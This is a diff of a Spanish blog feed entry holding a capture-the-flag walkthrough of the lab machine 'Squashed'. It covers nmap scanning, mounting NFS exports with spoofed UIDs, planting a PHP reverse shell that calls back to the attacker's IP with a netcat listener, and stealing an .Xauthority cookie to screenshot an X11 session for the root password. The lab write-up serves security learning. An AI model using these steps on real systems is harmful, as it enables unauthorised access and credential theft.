-&lt;p&gt;Iniciamos con un escaneo con el comando&lt;/p&gt;
-
-&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sudo nmap -sS -n -Pn --open -p- 10.10.11.191&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;El cual esta haciendo:&lt;/p&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;
-    &lt;p&gt;sS: haga un TCP SYN Scan el cual hace que el destino responda con un RST si el puerto esta cerrado, o con un SYN/ACK si esta abierto, esto con el fin de iniciar la conexion sin que termine&lt;/p&gt;
-  &lt;/li&gt;
-  &lt;li&gt;
-    &lt;p&gt;n: para que no haga resolucion DNS y tarde menos el escaneo&lt;/p&gt;
-  &lt;/li&gt;
-  &lt;li&gt;
-    &lt;p&gt;Pn: para evitar el descubrimiento de hosts&lt;/p&gt;
-  &lt;/li&gt;
-  &lt;li&gt;
-    &lt;p&gt;open: para que solo muestre los puertos abiertos&lt;/p&gt;
-  &lt;/li&gt;
-  &lt;li&gt;
-    &lt;p&gt;p-: para que escanee todo el rango de puertos&lt;/p&gt;
-  &lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;Y nos reporto que hay varios puertos abiertos:&lt;/p&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;PORT      STATE SERVICE
-22/tcp    open  ssh
-80/tcp    open  http
-111/tcp   open  rpcbind
-2049/tcp  open  nfs
-33331/tcp open  diamondport
-41253/tcp open  unknown
-44525/tcp open  unknown
-54989/tcp open  unknown
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Ahora escanearemos los puertos 22, 80 y 111 buscando la version y servicio que esten corriendo:&lt;/p&gt;
-
-&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nmap -sCV -p22,80,111,2049 10.10.11.191&lt;/code&gt;&lt;/p&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;PORT     STATE SERVICE VERSION
-22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
-| ssh-hostkey: 
-|   3072 48add5b83a9fbcbef7e8201ef6bfdeae (RSA)
-|   256 b7896c0b20ed49b2c1867c2992741c1f (ECDSA)
-|_  256 18cd9d08a621a8b8b6f79f8d405154fb (ED25519)
-80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
-|_http-title: Index of /
-|_http-server-header: Apache/2.4.41 (Ubuntu)
-111/tcp  open  rpcbind 2-4 (RPC #100000)
-| rpcinfo: 
-|   program version    port/proto  service
-|   100000  2,3,4        111/tcp   rpcbind
-|   100000  2,3,4        111/udp   rpcbind
-|   100000  3,4          111/tcp6  rpcbind
-|   100000  3,4          111/udp6  rpcbind
-|   100003  3           2049/udp   nfs
-|   100003  3           2049/udp6  nfs
-|   100003  3,4         2049/tcp   nfs
-|   100003  3,4         2049/tcp6  nfs
-|   100005  1,2,3      44911/udp   mountd
-|   100005  1,2,3      47352/udp6  mountd
-|   100005  1,2,3      50313/tcp6  mountd
-|   100005  1,2,3      54989/tcp   mountd
-|   100021  1,3,4      36833/tcp6  nlockmgr
-|   100021  1,3,4      44525/tcp   nlockmgr
-|   100021  1,3,4      50308/udp   nlockmgr
-|   100021  1,3,4      60392/udp6  nlockmgr
-|   100227  3           2049/tcp   nfs_acl
-|   100227  3           2049/tcp6  nfs_acl
-|   100227  3           2049/udp   nfs_acl
-|_  100227  3           2049/udp6  nfs_acl
-2049/tcp open  nfs_acl 3 (RPC #100227)
-Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;Nos reportara mucha informacion, de la cual les puedo ir diciento que en SHH no podemos hacer nada y en el puerto 80 HTTP solo es una pagina web estatica donde tampoco podremos hacer nada (de momento).&lt;/p&gt;
-
-&lt;p&gt;Si vemos el servicio que esta corriendo en el puerto 111 es el &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rpcbind&lt;/code&gt;, sin embargo, al intertar conectarse con rpcclient no se puede. Por otra parte vemos que tenemos que esta corriendo un NFS a travez del puerto 2049:&lt;/p&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;|   100003  3           2049/udp   nfs
-|   100003  3           2049/udp6  nfs
-|   100003  3,4         2049/tcp   nfs
-|   100003  3,4         2049/tcp6  nfs
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;Asi que vamos por ahi.&lt;/p&gt;
-
-&lt;h3 id=&quot;enumeracion-nfs&quot;&gt;Enumeracion NFS&lt;/h3&gt;
-
-&lt;p&gt;Lo primero que debemos de ver es si existen directorios que nos podemos montar, esto con el comando:&lt;/p&gt;
-
-&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;showmount -e 10.10.11.191&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;Esto nos arroja:&lt;/p&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Export list for 10.10.11.191:
-/home/ross    *
-/var/www/html *
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;Ahora pasaremos a montarnos esos dos directorios con los comandos:&lt;/p&gt;
-
-&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sudo mount -t nfs 10.10.11.191:/home/ross /mnt/ross -o nolock&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sudo mount -t nfs 10.10.11.191:/var/www/html /mnt/web -o nolock&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;La ruta donde me los estoy montando son:&lt;/p&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;/mnt/ross
-/mnt/web
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Ahora pasaremos a revisar que permisos son los que tienen ambos directorios que nos montamos, usando el comando:&lt;/p&gt;
-
-&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sudo nmap -sV --script=nfs-ls 10.10.11.191&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;Vemos que para /home/ross nos muestra:&lt;/p&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;| nfs-ls: Volume /home/ross
-|   access: Read Lookup NoModify NoExtend NoDelete NoExecute
-| PERMISSION  UID   GID   SIZE  TIME                 FILENAME
-| rwxr-xr-x   1001  1001  4096  2023-04-05T05:07:21  .
-| ??????????  ?     ?     ?     ?                    ..
-| rwx------   1001  1001  4096  2022-10-21T14:57:01  .cache
-| rwx------   1001  1001  4096  2022-10-21T14:57:01  .config
-| rwx------   1001  1001  4096  2022-10-21T14:57:01  .local
-| rw-------   1001  1001  2475  2022-12-27T15:33:41  .xsession-errors.old
-| rwxr-xr-x   1001  1001  4096  2022-10-21T14:57:01  Documents
-| rwxr-xr-x   1001  1001  4096  2022-10-21T14:57:01  Music
-| rwxr-xr-x   1001  1001  4096  2022-10-21T14:57:01  Pictures
-| rwxr-xr-x   1001  1001  4096  2022-10-21T14:57:01  Public
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;En donde lo interesante es que el UID y GID estan definidos como 1001, sin embargo en mi maquina no hay nigun usuario con ese UID&lt;/p&gt;
-
-&lt;p&gt;Directorio /var/www/html:&lt;/p&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;| Volume /var/www/html
-|   access: Read NoLookup NoModify NoExtend NoDelete NoExecute
-| PERMISSION  UID   GID  SIZE  TIME                 FILENAME
-| rwxr-xr--   2017  33   4096  2023-04-06T00:40:01  .
-| ??????????  ?     ?    ?     ?                    ..
-| ??????????  ?     ?    ?     ?                    .htaccess
-| ??????????  ?     ?    ?     ?                    css
-| ??????????  ?     ?    ?     ?                    images
-| ??????????  ?     ?    ?     ?                    index.html
-| ??????????  ?     ?    ?     ?                    js
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;Es lo mismo de arriba, solo que el UID es 2017&lt;/p&gt;
-
-&lt;p&gt;Como extra, dentro dentro de la carpeta &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Documents&lt;/code&gt; de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ross&lt;/code&gt;, hay un archivo de un gestor de contraseñas que podriamos intentar crackear, pero les digo que no es por ahi&lt;/p&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;󰣇  c4rta /mnt/ross  tree      
-.
-├── Desktop
-├── Documents
-│   └── Passwords.kdbx ---&amp;gt; archivo de contraseñas
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;h2 id=&quot;explotando-nfs-y-flag-de-user&quot;&gt;Explotando NFS y flag de user&lt;/h2&gt;
-
-&lt;h3 id=&quot;directorio-varwwwhtml&quot;&gt;Directorio /var/www/html&lt;/h3&gt;
-
-&lt;p&gt;Como sabermos que solo vamos a tener acceso con un usuario con el UID 2017, podemos crear un usuario en muestra maquina y asignarle ese UID:&lt;/p&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sudo useradd web
-sudo usermod -u 2017 web
-sudo groupmod -g 2017 web
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Ahora inicamos sesion con ese usuario y ya podemos navegar entre ese directorio&lt;/p&gt;
-
-&lt;p&gt;Una vez dentro, tenemos archivos de un sitio web, ese sitio web corresponde al sitio web de la maquina, y asu vez, ese directorio que montamos esta sincronizado con el de la maquina, asi que lo que intentaremos es crear un archivo php que sea una reverse shell y luego acceder a ese recurso.&lt;/p&gt;
-
-&lt;p&gt;Usare la reverse shell de pentest monkey.&lt;/p&gt;
-
-&lt;p&gt;En el directorio /var/www/html creare un archivo llamado &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;shell.php&lt;/code&gt;, donde pegare la reverse shell y editare la IP Y puerto, de esta manera:&lt;/p&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ip = '10.10.14.21';  // CHANGE THIS
-$port = 443; 
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Ahora me pondre en escucha por netcat:&lt;/p&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nc -nlvp 443
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;Y accedere al recurso:&lt;/p&gt;
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http://10.10.11.191/shell.php
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;Y con eso ya obtuvimos una reverse shell, ahora toca hacerla interactiva y ya hemos conseguido la flag de user:&lt;/p&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;alex@squashed:/home/alex$ cat user.txt
-cat user.txt
-5ada1f0eea8f0909d110e6290f695705
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;h2 id=&quot;flag-de-root-via-x11&quot;&gt;Flag de root via X11&lt;/h2&gt;
-
-&lt;p&gt;Recordemos que anteriormente en el directorio &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/home/ross&lt;/code&gt; estaba establecido con el UID 1001, asi que como hicimos con el otro directorio, crearemos un usuario que le asignaremos el UID 1001 para que podamos leer todos los archivos.&lt;/p&gt;
-
-&lt;p&gt;Vemos que en el directorio existe el archivo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.Xauthority&lt;/code&gt; y &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.xsession&lt;/code&gt;, estos significa que se puede configurar una pantalla X11, .Xauthority se usa para almacenar una &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Magic cookie&lt;/code&gt;, que simplemente es una cookie para poder conectarse a un servidor X11, si nosotros tenemos la cookie de una persona o su archivo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.Xauthority&lt;/code&gt; con esa cookie, lo que podriamos hacer es tomar una captura de su pantalla&lt;/p&gt;
-
-&lt;p&gt;Primeramente veremos que sesiones activas existen en el usuario &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;alex&lt;/code&gt; (cuando conseguimos la reverse shell):&lt;/p&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;alex@squashed:/home/alex$ w
-w
- 01:16:44 up 20:09,  1 user,  load average: 0.00, 0.00, 0.00
-USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
-ross     tty7     :0               Wed05   20:09m  2:21   0.04s /usr/libexec/gnome-session-binary --systemd --session=gnome
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Vemos que existe una sesion activa de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ross&lt;/code&gt; usando la pantalla &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;:0&lt;/code&gt;.&lt;/p&gt;
-
-&lt;p&gt;Entonces lo que tenemos que hacer es:&lt;/p&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;Pasarnos el archivo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.Xauthority&lt;/code&gt; a Alex&lt;/li&gt;
-  &lt;li&gt;Desde Alex, configuraremos la variable de entorno &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;XAUTHORITY&lt;/code&gt; con el &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.Xauthority&lt;/code&gt; de ross&lt;/li&gt;
-  &lt;li&gt;Tomaremos una captura de pantalla y conseguiremos la flag de root&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;Para pasarnos el archivo vamos a crear un servidor web con python en el directorio &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/mnt/ross&lt;/code&gt; (ese es el directorio donde monte &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/home/ross&lt;/code&gt;):&lt;/p&gt;
-
-&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;python3 -m http.server 8080&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;Y luego desde el usuario &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Alex&lt;/code&gt; descargaremos el &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.Xauthority&lt;/code&gt;:&lt;/p&gt;
-
-&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;wget 10.10.14.21:8080/.Xauthority&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;Ahora definitemos la variable de entorno con el &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.Xauthority&lt;/code&gt; de ross:&lt;/p&gt;
-
-&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;XAUTHORITY=/home/alex/.Xauthority&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;Ahora tomare una captura de pantalla:&lt;/p&gt;
-
-&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;xwd -root -screen -silent -display :0 &amp;gt; root.xwd&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;Por ultimo como sabemos que esta sincronizado el directorio &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/var/www/html&lt;/code&gt; con el que montamos, pasare el archivo que nos dejo la captura de pantalla hacia ese directorio.&lt;/p&gt;
-
-&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cp root.xwd /var/www/html&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;Una vez teniendo el archivo lo pasaremos a PNG:&lt;/p&gt;
-
-&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;convert root.xwd root.png&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;Y ya podriamos ver la contraseña de root&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/img/squashed/root.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Ahora solo queda iniciar sesion como root y ver la flag&lt;/p&gt;
-
-&lt;p&gt;Eso ha sido todo, gracias por leer ❤&lt;/p&gt;</content><author><name>c4rta</name></author><category term="posts" /><category term="nfs" /><category term="X11" /><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="/assets/img/squashed/waifu.gif" /><media:content medium="image" url="/assets/img/squashed/waifu.gif" xmlns:media="http://search.yahoo.com/mrss/" /></entry></feed>
+&lt;p&gt;Eso ha sido todo, gracias por leer ❤&lt;/p&gt;</content><author><name>c4rta</name></author><category term="posts" /><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="/assets/img/busqueda/waifu.gif" /><media:content medium="image" url="/assets/img/busqueda/waifu.gif" xmlns:media="http://search.yahoo.com/mrss/" /></entry></feed>
